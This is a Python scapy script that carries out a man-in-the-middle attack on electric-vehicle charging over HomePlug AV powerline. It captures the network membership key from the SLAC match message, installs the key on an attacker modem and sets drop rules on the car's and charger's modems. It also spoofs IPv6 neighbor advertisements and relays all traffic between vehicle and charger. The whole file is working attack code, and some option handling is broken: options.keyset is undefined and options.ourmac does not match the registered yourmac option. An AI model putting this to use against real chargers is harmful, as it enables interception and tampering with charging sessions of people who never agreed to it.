import os
from scapy.all import Ether, IPv6, sendp, sniff, ICMPv6ND_NS, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
from scapy.contrib.homeplugav import HomePlugAV
from scapy.contrib.homepluggp import CM_SET_KEY_REQ
from optparse import OptionParser


int6krule = "/home/jakob/git/open-plc-utils/plc/int6krule"
pev_modem_mac = None #"98:ed:5c:93:0d:66"
evse_modem_mac = "00:01:87:05:b7:95"
evse_mac = None
pev_mac = None


def set_key_on_modem(nid, nmk, srcmac, dstmac, interface):
    set_key_pkg = Ether(src=srcmac, dst=dstmac) \
        / HomePlugAV(version=0x01, HPtype=0x6008) \
        / CM_SET_KEY_REQ(KeyType=0x1, MyNonce=0xAAAAAAAA, YourNonce=0xe0218244, PID=0x4, NetworkID=nid, NewEncKeySelect=0x1, NewKey=nmk)

    # send packet twice -> first time the response is a failure for some reason
    sendp(set_key_pkg, iface=interface, verbose=1)
    sendp(set_key_pkg, iface=interface, verbose=1)


def handle_cm_slac_match_cnf(packet, iface, src_mac, dst_mac):
    nid = packet['CM_SLAC_MATCH_CNF']['SLAC_varfield'].NetworkID
    nmk = packet['CM_SLAC_MATCH_CNF']['SLAC_varfield'].NMK
    
    print('found CM_SLAC_MATCH_CNF message')
    print("NID: " + ':'.join(f'{byte:02X}' for byte in nid))
    print("NID: " + ''.join(f'{byte:02X}' for byte in nid))
    print()
    print("NMK: " + ':'.join(f'{byte:02X}' for byte in nmk))
    print("NMK: " + ''.join(f'{byte:02X}' for byte in nmk))

    set_key_on_modem(nid, nmk, src_mac, dst_mac, iface)


def handle_packet(packet, iface, our_mac, dst_mac):
    global evse_mac, pev_mac

    if 'HomePlugAV' in packet and packet['HomePlugAV'].HPtype == 0x607d:
        handle_cm_slac_match_cnf(packet, iface, our_mac, dst_mac)

        # Get pev and evse mac addresses
        evse_mac = packet[Ether].src
        pev_mac = packet[Ether].dst

        # Add rules to powerline modems
        if pev_modem_mac is not None:
            os.system(f"{int6krule} -i {iface} DropRX Any EthSA Not {our_mac} add temp '{pev_modem_mac}'")
        if evse_modem_mac is not None:
            os.system(f"{int6krule} -i {iface} DropRX Any EthSA Not {our_mac} add temp '{evse_modem_mac}'")

    if ICMPv6ND_NS in packet and IPv6 in packet:
        source_ip = packet[IPv6].src
        target_ip = packet[ICMPv6ND_NS].tgt

        # Construct a Neighbor Advertisement
        na_packet = (
            Ether(dst=packet[Ether].src, src=our_mac) /
            IPv6(dst=source_ip, src=target_ip) /
            ICMPv6ND_NA(tgt=target_ip, R=0, S=1, O=1) /
            ICMPv6NDOptDstLLAddr(lladdr=our_mac)
        )
        sendp(na_packet, iface=iface)

    if Ether in packet and str(packet[Ether].src) == pev_mac and str(packet[Ether].dst) == our_mac:
        if ICMPv6ND_NS in packet or ICMPv6ND_NA in packet:
            return # drop neighbor solicitation / advertisements between PEV and EVSE
        modified_packet = packet.copy()
        modified_packet[Ether].src = our_mac
        modified_packet[Ether].dst = evse_mac
        sendp(modified_packet, iface=iface)

    if Ether in packet and str(packet[Ether].src) == evse_mac and str(packet[Ether].dst) == our_mac:
        if ICMPv6ND_NS in packet or ICMPv6ND_NA in packet:
            return # drop neighbor solicitation / advertisements between PEV and EVSE
        modified_packet = packet.copy()
        modified_packet[Ether].src = our_mac
        modified_packet[Ether].dst = pev_mac
        sendp(modified_packet, iface=iface)

    if Ether in packet and (str(packet[Ether].src) == pev_mac or str(packet[Ether].src) == evse_mac) and str(packet[Ether].dst) == "33:33:00:00:00:01":
        if ICMPv6ND_NS in packet or ICMPv6ND_NA in packet:
            return # drop neighbor solicitation / advertisements between PEV and EVSE

        # forward SDP request
        modified_packet = packet.copy()
        modified_packet[Ether].src = our_mac
        sendp(modified_packet, iface=iface)



if __name__ =="__main__":
    usage = "usage: %prog [options] \nUse this program to extract the NID and NMK of the CM_SLAC_MATCH.CNF message and configure rules for the pev and evse powerline modems to accept only packets from the given source-mac (your mac). Then spoof the sdp request and read all the traffic as mitm."
    parser = OptionParser(usage)
    parser.add_option("-i", "--interface", help="Interface where the powerline modem is connected", metavar="INTERFACE")
    parser.add_option("-y", "--yourmac", help="Your MAC Address of the given Interface", metavar="OURMAC")
    parser.add_option("-d", "--destinationmac", help="MAC Address of the mitm modem, to which the set_key message ist sent", metavar="DESTINATIONMAC")
    (options, _) = parser.parse_args()

    set_key_after_sniffing = False
    if options.keyset:
        if not(options.interface):
            print("The interface must be specified.")
            exit(1)
        if not(options.destinationmac):
            print("The destination mac of the mitm modem must be specified.")
        if not(options.ourmac):
            print("Your own mac must be specified.")
    
    print("starting to sniff for a CM_SLAC_MATCH_CNF")
    sniff(iface=options.interface, prn=lambda packet: handle_packet(packet, options.interface, options.ourmac, options.destinationmac), store=False)
